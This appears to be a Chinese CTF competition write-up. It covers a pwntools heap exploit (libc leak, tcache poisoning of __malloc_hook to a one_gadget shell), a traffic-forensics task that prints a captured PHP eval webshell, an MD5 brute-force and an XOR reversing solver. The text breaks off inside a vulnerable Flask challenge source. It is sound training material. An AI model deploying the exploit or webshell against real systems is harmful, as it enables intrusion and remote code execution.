+<p>libc &#x3D; ELF(“libc.so.6”)<br>def get_p(file):<br>    elf &#x3D; ELF(file)<br>    #p &#x3D; elf.process()<br>    p &#x3D; remote(“8.147.129.22”,32449)<br>    return p,elf</p>
+<p>def debug():<br>    pause()<br>    gdb.attach(p)<br>    sleep(2)</p>
+<p>p,elf &#x3D; get_p(“.&#x2F;Heap”)</p>
+<p>‘’’<br>def xxx():<br>    p.sendlineafter()<br>    p.sendlineafter()<br>    p.sendlineafter()<br>‘’’</p>
+<p>def add_heap(size,content):<br>    p.sendlineafter(b”adventurer? “,b”1”)<br>    p.sendlineafter(b”bytes): “,str(size))<br>    p.sendlineafter(b”bytes):n”,content)</p>
+<p>def free_heap(idx):<br>    p.sendlineafter(b”adventurer? “,b”2”)<br>    p.sendlineafter(b”: “,str(idx))</p>
+<p>def edit_heap(idx,content):<br>    p.sendlineafter(b”adventurer? “, b”3”)<br>    p.sendlineafter(b”: “,str(idx))<br>    p.sendlineafter(b”:n”,content)</p>
+<p>def show_heap(idx):<br>    p.sendlineafter(b”adventurer? “,b”4”)<br>    p.sendlineafter(b”: “,str(idx))</p>
+<p>add_heap(0x440,b”A”)    #chunk 0<br>add_heap(0x440,b”A”)    #chunk 1</p>
+<p>free_heap(0)<br>show_heap(0)</p>
+<p>libc.address &#x3D; u64(p.recvuntil(b”x7f”)[-6:].ljust(8,b”x00”)) - 0x1ebbe0<br>log.success(“libc &#x3D;” + hex(libc.address))</p>
+<p>malloc_hook &#x3D; libc.sym[“__malloc_hook”]</p>
+<p>add_heap(0x10,b”A”)  #chunk 2<br>add_heap(0x10,b’A’)  #chunk 3</p>
+<p>free_heap(2)<br>free_heap(3)</p>
+<p>edit_heap(3,p64(malloc_hook))</p>
+<p>one_gadgets &#x3D; [0xe6c7e,0xe6c81,0xe6c84]<br>og &#x3D; libc.address + one_gadgets[1]</p>
+<p>add_heap(0x10,b”A”)<br>add_heap(0x10,p64(og))</p>
+<p>p.sendlineafter(b”adventurer? “, b”1”)<br>p.sendlineafter(b”bytes): “, b”10”)<br>p.interactive()</p>
+<p>Misc</p>
+<p>BrickGame</p>
+<p>玩三关小游戏获得flag，也可以直接伪造成功的包，这里我玩游戏过的，结果就是web痛失前三</p>
+<p>漏洞探踪，流量解密</p>
+<p>给了两个文件夹,一阶段和二阶段</p>
+<p>一阶段给了oa.access.log和第一阶段.cap</p>
+<p>题目要找ip,直接拷打gpt</p>
+<p>然后找到第二阶段压缩密码192.168.30.234</p>
+<p>这里翻了一下二阶段的http数据,看到了请求192.168.1.5&#x2F;key,所以直接筛选一下这个ip,就可以找到raw</p>
+<p>get 192.168.1.5&#x2F;key bdb8e21eace81d5fd21ca445ccb35071</p>
+<p>get 192.168.1.5&#x2F;raw</p>
+<p>bdb8e21eace81d5fd21ca445ccb350715a76f6751576dbe1af49328aa1d2d2bea16ef62afa3a7c616dbdb8e21eace81d5fd21ca445ccb35071</p>
+<p>仔细观察可以发现前32与后32个字符与 key一样，并且通过前面的提示可以知道这是密文，且使用rc4加密</p>
+<p>得到flag</p>
+<p>最安全的加密方式</p>
+<p>过滤HTTP流</p>
+<p>找到上传的一个PHP脚本和一个rar文件</p>
+<?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i<strlen($D);$i++) {
+        $c = $K[$i+1&15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+$pass='25ming@';
+$payloadName='payload';
+$key='3c6e0b8a9c15224a';
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        eval($payload);
+        echo substr(md5($pass.$key),0,16);
+        echo base64_encode(encode(@run($data),$key));
+        echo substr(md5($pass.$key),16);
+    }else{
+        if (stripos($data,"getBasicsInfo")!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
+
+猜测出rar密码为25ming@
+
+得到一串flag密文
+
+8fa14cdd754f91cc6554c9e71929cce7
+2db95e8e1a9267b7a1188556b2013b33
+0cc175b9c0f1b6a831c399e269772661
+b2f5ff47436671b6e533d8dc3614845d
+f95b70fdc3088560732a5ac135644506
+b9ece18c950afbfa6b0fdbfa4ff731d3
+2510c39011c5be704182423e3a695e91
+e1671797c52e15f763380b45e841ec32
+b14a7b8059d9c055954c92674ce60032
+6f8f57715090da2632453988d9a1501b
+cfcd208495d565ef66e7dff9f98764da
+03c7c0ace395d80182db07ae2c30f034
+e358efa489f58062f10dd7316b65649e
+b14a7b8059d9c055954c92674ce60032
+c81e728d9d4c2f636f067f89cc14862c
+e1671797c52e15f763380b45e841ec32
+4a8a08f09d37b73795649038408b5f33
+4c614360da93c0a041b22e537de151eb
+4b43b0aee35624cd95b910189b3dc231
+e1671797c52e15f763380b45e841ec32
+b14a7b8059d9c055954c92674ce60032
+e1671797c52e15f763380b45e841ec32
+8d9c307cb7f3c4a32822a51922d1ceaa
+4a8a08f09d37b73795649038408b5f33
+4b43b0aee35624cd95b910189b3dc231
+57cec4137b614c87cb4e24a3d003a3e0
+83878c91171338902e0fe0fb97a8c47a
+e358efa489f58062f10dd7316b65649e
+865c0c0b4ab0e063e5caa3387c1a8741
+d95679752134a2d9eb61dbd7b91c4bcc
+7b8b965ad4bca0e41ab51de7b31363a1
+9033e0e305f247c0c3c80d0c7848c8b3
+9033e0e305f247c0c3c80d0c7848c8b3
+9033e0e305f247c0c3c80d0c7848c8b3
+cbb184dd8e05c9709e5dcaedaa0495cf
+
+盲猜出题失误，直接爆破单字节md5。
+
+import hashlib
+import string
+
+flag = [
+    '8fa14cdd754f91cc6554c9e71929cce7',
+    '2db95e8e1a9267b7a1188556b2013b33',
+    '0cc175b9c0f1b6a831c399e269772661',
+    'b2f5ff47436671b6e533d8dc3614845d',
+    'f95b70fdc3088560732a5ac135644506',
+    'b9ece18c950afbfa6b0fdbfa4ff731d3',
+    '2510c39011c5be704182423e3a695e91',
+    'e1671797c52e15f763380b45e841ec32',
+    'b14a7b8059d9c055954c92674ce60032',
+    '6f8f57715090da2632453988d9a1501b',
+    'cfcd208495d565ef66e7dff9f98764da',
+    '03c7c0ace395d80182db07ae2c30f034',
+    'e358efa489f58062f10dd7316b65649e',
+    'b14a7b8059d9c055954c92674ce60032',
+    'c81e728d9d4c2f636f067f89cc14862c',
+    'e1671797c52e15f763380b45e841ec32',
+    '4a8a08f09d37b73795649038408b5f33',
+    '4c614360da93c0a041b22e537de151eb',
+    '4b43b0aee35624cd95b910189b3dc231',
+    'e1671797c52e15f763380b45e841ec32',
+    'b14a7b8059d9c055954c92674ce60032',
+    'e1671797c52e15f763380b45e841ec32',
+    '8d9c307cb7f3c4a32822a51922d1ceaa',
+    '4a8a08f09d37b73795649038408b5f33',
+    '4b43b0aee35624cd95b910189b3dc231',
+    '57cec4137b614c87cb4e24a3d003a3e0',
+    '83878c91171338902e0fe0fb97a8c47a',
+    'e358efa489f58062f10dd7316b65649e',
+    '865c0c0b4ab0e063e5caa3387c1a8741',
+    'd95679752134a2d9eb61dbd7b91c4bcc',
+    '7b8b965ad4bca0e41ab51de7b31363a1',
+    '9033e0e305f247c0c3c80d0c7848c8b3',
+    '9033e0e305f247c0c3c80d0c7848c8b3',
+    '9033e0e305f247c0c3c80d0c7848c8b3',
+    'cbb184dd8e05c9709e5dcaedaa0495cf',
+]
+
+alphabet = string.ascii_letters + string.digits + string.punctuation
+for x in range(len(flag)):
+    for i in alphabet:
+        en = hashlib.md5(i.encode()).hexdigest()
+        if en == flag[x]:
+            print(i, end="")
+
+# flag{The_m0st_2ecUre_eNcrYption!!!}
+
+Re
+
+easyre
+
+进来很明显看到了main函数
+
+动调发现是异或的算法，写出逆向流程，gpt分析这两个常量为正确的数据，根据gpt判断解，但是只能写出前33位的，最后10位靠猜。
+
+true_flag = [
+    0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 
+    0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, 
+    0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 
+    0x05, 0x57, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, 
+    0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x00, 0x1B, 
+    0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, 
+    0x4F, 0x57, 0x05, 0x54, 0x55, 0x03, 0x53, 0x57, 0x01, 0x03, 
+    0x07, 0x04, 0x4A, 0x77, 0x0D
+]
+
+tmp = 'f'
+for i in range(16):
+    next1 = true_flag[16 + i] ^ ord(tmp[-1])
+    tmp += chr(next1)
+
+print(tmp)
+for i in range(16):
+    next1 = true_flag[i] ^ ord(tmp[-1])
+    tmp += chr(next1)
+print(tmp)
+
+直接把最后十位可能的结果都输出
+
+for x in range(33, len(true_flag)):
+    tmp = 'flag{fcf94739-da66-467c-a77f-b50d'
+    for i in range(10):
+        next1 = true_flag[x + i] ^ ord(tmp[-1])
+        tmp += chr(next1)
+    print(tmp)
+
+# flag{fcf94739-da66-467c-a77f-b50diosnkn1<?;
+# flag{fcf94739-da66-467c-a77f-b50db~cfc<126<
+# flag{fcf94739-da66-467c-a77f-b50dxe`e:
+740:.
+# flag{fcf94739-da66-467c-a77f-b50dy|y&+(,&2{
+# flag{fcf94739-da66-467c-a77f-b50dad;651;/fc
+# flag{fcf94739-da66-467c-a77f-b50da>304>*cf1
+# flag{fcf94739-da66-467c-a77f-b50d;651;/fc44
+# flag{fcf94739-da66-467c-a77f-b50dijndp9<kkp
+# flag{fcf94739-da66-467c-a77f-b50dgci}41ff}d
+# flag{fcf94739-da66-467c-a77f-b50d`j~72ee~ge
+# flag{fcf94739-da66-467c-a77f-b50dnz36aazca`
+# flag{fcf94739-da66-467c-a77f-b50dp9<kkpikj>
+# flag{fcf94739-da66-467c-a77f-b50d-(d}~*d
+# flag{fcf94739-da66-467c-a77f-b50da66-467c-a
+# flag{fcf94739-da66-467c-a77f-b50d33(132f(d2
+# flag{fcf94739-da66-467c-a77f-b50ddfde13ee
+# flag{fcf94739-da66-467c-a77f-b50dfde13ee4
+# flag{fcf94739-da66-467c-a77f-b50d}~*d(~~/d
+# flag{fcf94739-da66-467c-a77f-b50dfg3}1gg6}2
+# flag{fcf94739-da66-467c-a77f-b50de13ee40g
+# flag{fcf94739-da66-467c-a77f-b50d0~2dd5~1fc
+# flag{fcf94739-da66-467c-a77f-b50d*f00a*e27c
+# flag{fcf94739-da66-467c-a77f-b50d(~~/d+|y-x
+# flag{fcf94739-da66-467c-a77f-b50d22c(g05a47
+# flag{fcf94739-da66-467c-a77f-b50dd5~1fc7ba2
+# flag{fcf94739-da66-467c-a77f-b50d5~1fc7ba2e
+# flag{fcf94739-da66-467c-a77f-b50d/`72f30c45
+# flag{fcf94739-da66-467c-a77f-b50d+|y-x{(~}
+# flag{fcf94739-da66-467c-a77f-b50d36b74g0125
+# flag{fcf94739-da66-467c-a77f-b50da5`c0gfebf
+# flag{fcf94739-da66-467c-a77f-b50d0ef5bc`gc)
+# flag{fcf94739-da66-467c-a77f-b50d12a67437}
+
+一眼锁定最后一个，提交正确。
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=%%</span><br><span class="line">import datetime</span><br><span class="line">from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response</span><br><span class="line">from wtforms import StringField, PasswordField, SubmitField</span><br><span class="line">from wtforms.validators import DataRequired, Length</span><br><span class="line">from flask_wtf import FlaskForm</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = &#x27;xxxxxxx&#x27;</span><br><span class="line"></span><br><span class="line">class RegistrationForm(FlaskForm):</span><br><span class="line">    username = StringField(&#x27;Username&#x27;, validators=[DataRequired(), Length(min=2, max=20)])</span><br><span class="line">    password = PasswordField(&#x27;Password&#x27;, validators=[DataRequired(), Length(min=6, max=20)])</span><br><span class="line">    submit = SubmitField(&#x27;Register&#x27;)</span><br><span class="line">    </span><br><span class="line">class LoginForm(FlaskForm):</span><br><span class="line">    username = StringField(&#x27;Username&#x27;, validators=[DataRequired(), Length(min=2, max=20)])</span><br><span class="line">    password = PasswordField(&#x27;Password&#x27;, validators=[DataRequired(), Length(min=6, max=20)])</span><br><span class="line">    submit = SubmitField(&#x27;Login&#x27;)</span><br><span class="line"></span><br><span class="line">class Candy:</span><br><span class="line">    def __init__(self, name, image):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.image = image</span><br><span class="line"></span><br><span class="line">class User:</span><br><span class="line">    def __init__(self, username, password):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    def verify_password(self, username, password):</span><br><span class="line">        return (self.username==username) &amp; (self.password==password)</span><br><span class="line">class Admin:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.username = &quot;&quot;</span><br><span class="line">        self.identity = &quot;&quot;</span><br><span class="line"></span><br><span class="line">def sanitize_inventory_sold(value):</span><br><span class="line">    return re.sub(r&#x27;[a-zA-Z_]&#x27;, &#x27;&#x27;, str(value))</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">candies = [Candy(name=&quot;Lollipop&quot;, image=&quot;images/candy1.jpg&quot;),</span><br><span class="line">    Candy(name=&quot;Chocolate Bar&quot;, image=&quot;images/candy2.jpg&quot;),</span><br><span class="line">    Candy(name=&quot;Gummy Bears&quot;, image=&quot;images/candy3.jpg&quot;)</span><br><span class="line">]</span><br><span class="line">users = []</span><br><span class="line">admin_user = []</span><br><span class="line">@app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def register():</span><br><span class="line">    form = RegistrationForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        user = User(username=form.username.data, password=form.password.data)</span><br><span class="line">        users.append(user)</span><br><span class="line">        return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line">    </span><br><span class="line">    return render_template(&#x27;register.html&#x27;, form=form)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        for u in users:</span><br><span class="line">            if u.verify_password(form.username.data, form.password.data):</span><br><span class="line">                session[&#x27;username&#x27;] = form.username.data</span><br><span class="line">                session[&#x27;identity&#x27;] = &quot;guest&quot;</span><br><span class="line">                return redirect(url_for(&#x27;home&#x27;))</span><br><span class="line">    </span><br><span class="line">    return render_template(&#x27;login.html&#x27;, form=form)</span><br><span class="line"></span><br><span class="line">inventory = 500</span><br><span class="line">sold = 0</span><br><span class="line">@app.route(&#x27;/home&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def home():</span><br><span class="line">    global inventory, sold</span><br><span class="line">    message = None</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line"></span><br><span class="line">    if not username:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    </span><br><span class="line">    if sold &gt;= 10 and sold &lt; 500:</span><br><span class="line">        sold = 0</span><br><span class="line">        inventory = 500</span><br><span class="line">        message = &quot;But you have bought too many candies!&quot;</span><br><span class="line">        return render_template(&#x27;home.html&#x27;, inventory=inventory, sold=sold, message=message, candies=candies)</span><br><span class="line"></span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        action = request.form.get(&#x27;action&#x27;)</span><br><span class="line">        if action == &quot;buy_candy&quot;:</span><br><span class="line">            if inventory &gt; 0:</span><br><span class="line">                inventory -= 3</span><br><span class="line">                sold += 3</span><br><span class="line">            if inventory == 0:</span><br><span class="line">                message = &quot;All candies are sold out!&quot;</span><br><span class="line">            if sold &gt;= 500:</span><br><span class="line">                with open(&#x27;secret.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">                    message = file.read()</span><br><span class="line"></span><br><span class="line">    return render_template(&#x27;home.html&#x27;, inventory=inventory, sold=sold, message=message, candies=candies)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def admin():</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line">    if not username or identity != &#x27;admin&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    admin = Admin()</span><br><span class="line">    merge(session,admin)</span><br><span class="line">    admin_user.append(admin)</span><br><span class="line">    return render_template(&#x27;admin.html&#x27;, view=&#x27;index&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin/view_candies&#x27;, 